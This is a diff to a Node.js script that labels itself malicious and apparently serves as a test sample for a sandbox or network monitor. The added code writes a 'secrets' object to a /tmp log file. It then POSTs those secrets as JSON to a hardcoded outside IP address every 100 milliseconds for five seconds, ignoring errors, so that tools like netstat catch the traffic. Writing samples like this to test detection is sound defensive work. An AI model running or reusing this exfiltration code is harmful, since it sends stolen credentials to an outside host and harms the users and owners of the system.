@@ -52,28 +52,42 @@ try {
     console.log('[Malicious] Could not write file:', e.message);
 }
 
-// 5. Try to make network connection (will fail in sandbox)
+// 5. Try to make network connection (loop to ensure capture)
 const http = require('http');
 const suspiciousIP = 'http://45.142.212.61:8080/collect';
 
 console.log('[Malicious] Attempting connection to:', suspiciousIP);
 
+// Create a file to ensure file logging
 try {
+    fs.writeFileSync('/tmp/exfiltration_log.txt', 'Stealing credentials...\n');
+    fs.appendFileSync('/tmp/exfiltration_log.txt', JSON.stringify(secrets));
+    console.log('[Malicious] Created log file at /tmp/exfiltration_log.txt');
+} catch (e) {
+    console.error('[Malicious] File write error:', e);
+}
+
+// Keep trying to connect for a few seconds to ensure netstat catches it
+const makeRequest = () => {
     const req = http.request(suspiciousIP, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' }
+        headers: { 'Content-Type': 'application/json' },
+        timeout: 2000
     }, (res) => {
         console.log('[Malicious] Connected! Status:', res.statusCode);
     });
     
     req.on('error', (error) => {
-        console.log('[Malicious] Connection failed:', error.code);
+        // Ignore errors, we expect them in sandbox
     });
     
     req.write(JSON.stringify(secrets));
     req.end();
-} catch (e) {
-    console.log('[Malicious] Network error:', e.message);
-}
+};
 
-console.log('[Malicious] Attack complete!');
+// Spam requests every 100ms for 5 seconds
+const interval = setInterval(makeRequest, 100);
+setTimeout(() => {
+    clearInterval(interval);
+    console.log('[Malicious] Attack complete!');
+}, 5000);
